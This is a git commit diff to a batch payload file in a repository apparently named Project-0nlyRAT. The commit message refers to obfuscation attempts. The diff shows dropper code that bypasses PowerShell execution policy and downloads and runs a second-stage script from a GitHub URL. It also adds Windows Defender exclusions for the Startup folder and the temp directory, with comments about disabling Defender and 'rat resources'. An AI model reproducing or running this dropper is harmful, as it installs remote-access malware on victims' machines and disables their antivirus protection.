3f905f3a587ce94673b0c350d7b53c3bda8cfb3d
Soumyo001 <www.soumyo@gmail.com>
2025-01-23 12:15:58 -0800

    obsf hard(try-4)

--- payloads/1.cmd
+++ payloads/1.cmd
@@ -37,8 +37,8 @@ REM disable defender
 REM rat resources
 
 REM Download and execute the installer script in an isolated environment, no connection with the parent pwsh
-powershell -noP -ep bypass start-process powershell.exe " {iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/2.ps1' -outfile '.\OVlqumatcNr.ps1';Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup';Add-MpPreference -ExclusionPath '$env:temp'}"
-set w=" {iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/2.ps1' -outfile '.\OVlqumatcNr.ps1';Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup';Add-MpPreference -ExclusionPath '$env:temp'}"
+powershell -noP -ep bypass start-process powershell.exe " {iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/2.ps1' -outfile '.\OVlqumatcNr.ps1';Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup';Add-MpPreference -ExclusionPath $env:temp}"
+set w=" {iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/2.ps1' -outfile '.\OVlqumatcNr.ps1';Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup';Add-MpPreference -ExclusionPath $env:temp}"
 echo %w%
 pause
 powershell -noP -ep bypass start-process powershell.exe ".\OVlqumatcNr.ps1"
